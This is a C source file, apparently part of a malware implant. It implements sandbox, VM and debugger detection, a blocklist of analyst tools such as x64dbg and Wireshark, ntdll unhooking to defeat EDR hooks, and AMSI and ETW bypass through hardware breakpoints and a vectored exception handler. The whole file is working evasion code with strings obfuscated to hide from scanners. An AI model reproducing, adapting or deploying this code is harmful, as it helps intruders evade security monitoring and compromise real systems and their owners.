/*
 * evasion.c — Anti-sandbox, NTDLL unhooking, AMSI/ETW bypass via HWBP+VEH.
 */
#include "../include/implant.h"
#include "../include/obfstr.h"
#include <string.h>

/* ── Timing anti-sandbox ─────────────────────────────────────────────────── */

static BOOL TimingSandboxCheck(void) {
    LARGE_INTEGER freq, t1, t2;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&t1);
    volatile int x = 0;
    for (int i = 0; i < 1000000; i++) x += i;
    QueryPerformanceCounter(&t2);
    LONGLONG us = (t2.QuadPart - t1.QuadPart) * 1000000 / freq.QuadPart;
    return (us < 2000 || us > 2000000);
}

/* ── VM detection ────────────────────────────────────────────────────────── */

BOOL IsVM(void) {
#if defined(__GNUC__)
    unsigned int ecx = 0;
    __asm__ volatile("cpuid" : "=c"(ecx) : "a"(1) : "ebx", "edx");
    if (ecx & (1u << 31)) return TRUE;

    {
        unsigned int eax=0, ebx=0, ecx2=0, edx=0;
        __asm__ volatile("cpuid"
            : "=a"(eax),"=b"(ebx),"=c"(ecx2),"=d"(edx) : "a"(0x40000000) :);
        char v[13]={0};
        memcpy(v,&ebx,4); memcpy(v+4,&ecx2,4); memcpy(v+8,&edx,4);
        if (memcmp(v,"VMwa",4)==0 || memcmp(v,"VBox",4)==0 ||
            memcmp(v,"Micr",4)==0 || memcmp(v,"KVMK",4)==0)
            return TRUE;
    }
#endif

    typedef LONG (WINAPI *pfnRegOpenKeyExA)(HKEY,LPCSTR,DWORD,REGSAM,PHKEY);
    static pfnRegOpenKeyExA pOpen = NULL;
    if (!pOpen) {
        HMODULE h = g_LoadLibraryA(OBFSTR("advapi32.dll"));
        if (h) pOpen = (pfnRegOpenKeyExA)(FARPROC)g_GetProcAddress(h, OBFSTR("RegOpenKeyExA"));
    }
    if (pOpen) {
        const char *keys[] = {
            OBFSTR("SYSTEM\\CurrentControlSet\\Services\\VBoxGuest"),
            OBFSTR("SYSTEM\\CurrentControlSet\\Services\\vmhgfs"),
            OBFSTR("SOFTWARE\\VMware, Inc.\\VMware Tools"),
            OBFSTR("SOFTWARE\\Oracle\\VirtualBox Guest Additions"),
        };
        typedef LONG (WINAPI *pfnRegCloseKey)(HKEY);
        static pfnRegCloseKey pClose = NULL;
        if (!pClose) {
            HMODULE h = g_GetModuleHandleA(OBFSTR("advapi32.dll"));
            if (h) pClose = (pfnRegCloseKey)(FARPROC)g_GetProcAddress(h, OBFSTR("RegCloseKey"));
        }
        for (int i = 0; i < (int)ARRAY_SIZE(keys); i++) {
            HKEY hk;
            if (pOpen(HKEY_LOCAL_MACHINE, keys[i], 0, KEY_READ, &hk) == 0) {
                if (pClose) pClose(hk);
                return TRUE;
            }
        }
    }
    return FALSE;
}

/* ── Debugger detection ──────────────────────────────────────────────────── */

BOOL IsDebugged(void) {
    PVOID peb = (PVOID)READ_GS_QWORD(0x60);
    if (*(BYTE*)((BYTE*)peb + 2)) return TRUE;

    ULONG_PTR dbgPort = 0;
    NtQueryProcInfo((HANDLE)(LONG_PTR)-1, (PROCESSINFOCLASS)7,
                    &dbgPort, sizeof(dbgPort), NULL);
    if (dbgPort) return TRUE;

    PVOID heap  = *(PVOID*)((BYTE*)peb + 0x30);
    DWORD flags = *(DWORD*)((BYTE*)heap + 0x70);
    if (flags & 0x40) return TRUE;

    return FALSE;
}

/* ── Uptime check ────────────────────────────────────────────────────────── */
/* Sandbox VMs are typically freshly restored; legitimate endpoints have been
 * running for at least a few minutes.  180 s threshold catches most snapshots. */
static BOOL LowUptime(void) {
    return GetTickCount64() < (3ULL * 60 * 1000);
}

/* ── Parent process blacklist ─────────────────────────────────────────────── */
static BOOL SuspiciousParent(void) {
    NT_PROCESS_BASIC_INFO pbi;
    ULONG retLen = 0;
    if (!NT_SUCCESS(NtQueryProcInfo((HANDLE)(LONG_PTR)-1,
                                    (PROCESSINFOCLASS)0,
                                    &pbi, sizeof(pbi), &retLen)))
        return FALSE;
    DWORD ppid = (DWORD)pbi.InheritedFromUniqueProcessId;
    if (!ppid) return FALSE;

    HANDLE hParent = NULL;
    if (!NT_SUCCESS(NtOpenProc(ppid, PROCESS_QUERY_LIMITED_INFORMATION, &hParent)))
        return FALSE;

    char path[MAX_PATH] = {0};
    DWORD plen = MAX_PATH;
    HMODULE k32 = g_GetModuleHandleA(OBFSTR("kernel32.dll"));
    typedef BOOL (WINAPI *pfnQFPI)(HANDLE, DWORD, LPSTR, PDWORD);
    pfnQFPI pFn = k32 ? (pfnQFPI)(FARPROC)g_GetProcAddress(k32, OBFSTR("QueryFullProcessImageNameA")) : NULL;
    BOOL got = pFn ? pFn(hParent, 0, path, &plen) : FALSE;
    CloseHandle(hParent);
    if (!got || !plen) return FALSE;

    /* Extract basename and lowercase */
    int last = -1;
    for (int i = 0; path[i]; i++)
        if (path[i] == '\\' || path[i] == '/') last = i;
    char *name = path + last + 1;
    for (int i = 0; name[i]; i++)
        if (name[i] >= 'A' && name[i] <= 'Z') name[i] += 32;

    const char *bad[] = {
        OBFSTR("x64dbg.exe"),    OBFSTR("x32dbg.exe"),
        OBFSTR("ollydbg.exe"),   OBFSTR("windbg.exe"),
        OBFSTR("idaq.exe"),      OBFSTR("idaq64.exe"),
        OBFSTR("procmon.exe"),   OBFSTR("procmon64.exe"),
        OBFSTR("wireshark.exe"), OBFSTR("fiddler.exe"),
    };
    for (int i = 0; i < (int)ARRAY_SIZE(bad); i++)
        if (strcmp(name, bad[i]) == 0) return TRUE;
    return FALSE;
}

/* ── Last-input idle ─────────────────────────────────────────────────────── */
/* A machine where the last input time equals (or exceeds) the system uptime
 * has never received real human input — characteristic of a headless sandbox. */
static BOOL NeverHadInput(void) {
    LASTINPUTINFO lii;
    lii.cbSize = sizeof(lii);
    if (!GetLastInputInfo(&lii)) return FALSE;
    DWORD now    = GetTickCount();
    DWORD idleMs = now - lii.dwTime;
    /* Idle since boot (with ±5 s tolerance for early input at login screen) */
    return idleMs + 5000 >= (DWORD)GetTickCount64();
}

BOOL IsSandbox(void) {
    return TimingSandboxCheck() || IsVM() || IsDebugged()
        || LowUptime() || SuspiciousParent() || NeverHadInput();
}

/* ── NTDLL unhooking ─────────────────────────────────────────────────────── */
/*
 * Strategy: open a fresh handle to \KnownDlls\ntdll.dll (which EDR cannot
 * hook before we read it), map it as SEC_IMAGE, then overwrite the loaded
 * ntdll .text section with the clean on-disk bytes.
 * All file/section operations go through our direct syscalls so EDR's
 * userland hooks in ntdll can't intercept them.
 */

static void InitUnicodeString(NT_UNICODE_STRING *us, WCHAR *buf, const WCHAR *src) {
    int i = 0;
    while (src[i]) { buf[i] = src[i]; i++; }
    buf[i] = L'\0';
    us->Buffer        = buf;
    us->Length        = (USHORT)(i * 2);
    us->MaximumLength = (USHORT)((i + 1) * 2);
}

BOOL UnhookNtdll(void) {
    /* Build NT path: \??\C:\Windows\System32\ntdll.dll */
    WCHAR pathBuf[64];
    /* Build manually to avoid the string appearing in .rodata */
    /* "\\??\\C:\\Windows\\System32\\ntdll.dll" */
    const WCHAR *ntpath = L"\\??\\C:\\Windows\\System32\\ntdll.dll";
    NT_UNICODE_STRING us;
    InitUnicodeString(&us, pathBuf, ntpath);

    HANDLE hFile = NULL;
    NTSTATUS st = NtOpenFile(&us, NT_FILE_READ_DATA | SYNCHRONIZE, &hFile);
    if (!NT_SUCCESS(st) || !hFile) return FALSE;

    PVOID  cleanBase = NULL;
    SIZE_T viewSize  = 0;
    st = NtMapSection(hFile, &cleanBase, &viewSize);
    CloseHandle(hFile);
    if (!NT_SUCCESS(st) || !cleanBase) return FALSE;

    /* Locate loaded ntdll base */
    PVOID loadedBase = (PVOID)READ_GS_QWORD(0x60);
    loadedBase = *(PVOID*)((BYTE*)loadedBase + PEB_OFFSET_LDR);
    /* Walk LDR to find ntdll — reuse the same offset logic as hellsgate.c */
    {
        LIST_ENTRY *head = (LIST_ENTRY*)((BYTE*)loadedBase + LDR_OFFSET_INLOAD_LIST);
        loadedBase = NULL;
        for (LIST_ENTRY *e = head->Flink; e != head; e = e->Flink) {
            USHORT  len = *(USHORT*)((BYTE*)e + LDR_ENTRY_OFFSET_BASENAME + USTR_OFFSET_LENGTH);
            WCHAR  *buf2 = *(WCHAR**)((BYTE*)e + LDR_ENTRY_OFFSET_BASENAME + USTR_OFFSET_BUFFER);
            /* ntdll.dll = 18 bytes */
            if (len == 18 && buf2) {
                /* compare first 5 chars: ntdll */
                if ((buf2[0]|32)=='n' && (buf2[1]|32)=='t' && (buf2[2]|32)=='d' &&
                    (buf2[3]|32)=='l' && (buf2[4]|32)=='l') {
                    loadedBase = *(PVOID*)((BYTE*)e + LDR_ENTRY_OFFSET_DLLBASE);
                    break;
                }
            }
        }
    }
    if (!loadedBase) { NtUnmap(cleanBase); return FALSE; }

    /* Find .text section in both images and overwrite */
    BYTE *cleanPE  = (BYTE*)cleanBase;
    BYTE *loadedPE = (BYTE*)loadedBase;

    PIMAGE_NT_HEADERS ntClean  = (PIMAGE_NT_HEADERS)(cleanPE  + ((PIMAGE_DOS_HEADER)cleanPE)->e_lfanew);
    PIMAGE_NT_HEADERS ntLoaded = (PIMAGE_NT_HEADERS)(loadedPE + ((PIMAGE_DOS_HEADER)loadedPE)->e_lfanew);

    PIMAGE_SECTION_HEADER secC = IMAGE_FIRST_SECTION(ntClean);
    PIMAGE_SECTION_HEADER secL = IMAGE_FIRST_SECTION(ntLoaded);
    WORD nSec = ntClean->FileHeader.NumberOfSections;

    for (WORD i = 0; i < nSec; i++) {
        if (memcmp(secC[i].Name, ".text", 5) != 0) continue;

        BYTE  *dst  = loadedPE + secL[i].VirtualAddress;
        BYTE  *src2 = cleanPE  + secC[i].VirtualAddress;
        DWORD  len  = secC[i].Misc.VirtualSize;

        /* Make .text writable, overwrite, restore */
        ULONG old = 0;
        if (!NT_SUCCESS(NtProtect((HANDLE)(LONG_PTR)-1, dst, len, PAGE_EXECUTE_READWRITE, &old)))
            break;
        memcpy(dst, src2, len);
        NtProtect((HANDLE)(LONG_PTR)-1, dst, len, old, &old);
        break;
    }

    NtUnmap(cleanBase);
    return TRUE;
}

/* ── HWBP VEH for AMSI + ETW ─────────────────────────────────────────────── */

static PVOID s_amsi_addr = NULL;
static PVOID s_etw_addr  = NULL;

static LONG WINAPI EvasionVEH(PEXCEPTION_POINTERS ep) {
    if (ep->ExceptionRecord->ExceptionCode != STATUS_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    PCONTEXT ctx = ep->ContextRecord;

    if (s_amsi_addr && ctx->Rip == (DWORD64)s_amsi_addr) {
        ctx->Rax = 0;
        ctx->Rip += 3;
        ctx->Dr0  = (DWORD64)s_amsi_addr;
        ctx->Dr7 |= 1;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    if (s_etw_addr && ctx->Rip == (DWORD64)s_etw_addr) {
        ctx->Rax = 0;
        ctx->Rip += 3;
        ctx->Dr1  = (DWORD64)s_etw_addr;
        ctx->Dr7 |= 4;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

static void SetHWBP(DWORD64 addr, int drIdx) {
    typedef NTSTATUS (WINAPI *pfnNtGetCtx)(HANDLE, PCONTEXT);
    typedef NTSTATUS (WINAPI *pfnNtSetCtx)(HANDLE, PCONTEXT);
    HMODULE ntdll = g_GetModuleHandleA(OBFSTR("ntdll.dll"));
    if (!ntdll) return;
    pfnNtGetCtx pGet = (pfnNtGetCtx)(FARPROC)g_GetProcAddress(ntdll, OBFSTR("NtGetContextThread"));
    pfnNtSetCtx pSet = (pfnNtSetCtx)(FARPROC)g_GetProcAddress(ntdll, OBFSTR("NtSetContextThread"));
    if (!pGet || !pSet) return;
    CONTEXT ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
    HANDLE hThr = (HANDLE)(LONG_PTR)-2;
    if (pGet(hThr, &ctx) != 0) return;
    switch (drIdx) {
    case 0: ctx.Dr0 = addr; ctx.Dr7 = (ctx.Dr7 & ~0xFULL)   | 0x1ULL;  break;
    case 1: ctx.Dr1 = addr; ctx.Dr7 = (ctx.Dr7 & ~0xF0ULL)  | 0x4ULL;  break;
    }
    pSet(hThr, &ctx);
}

BOOL EvasionInit(void) {
    /* 1. Unhook ntdll before setting breakpoints */
    UnhookNtdll();

    /* 2. Register VEH */
    if (!AddVectoredExceptionHandler(1, EvasionVEH)) return FALSE;

    /* 3. AMSI */
    HMODULE amsi = g_LoadLibraryA(OBFSTR("amsi.dll"));
    if (amsi) {
        s_amsi_addr = (PVOID)g_GetProcAddress(amsi, OBFSTR("AmsiScanBuffer"));
        if (s_amsi_addr) SetHWBP((DWORD64)s_amsi_addr, 0);
    }

    /* 4. ETW */
    HMODULE ntdll = g_GetModuleHandleA(OBFSTR("ntdll.dll"));
    if (ntdll) {
        s_etw_addr = (PVOID)g_GetProcAddress(ntdll, OBFSTR("EtwEventWrite"));
        if (s_etw_addr) SetHWBP((DWORD64)s_etw_addr, 1);
    }
    return TRUE;
}
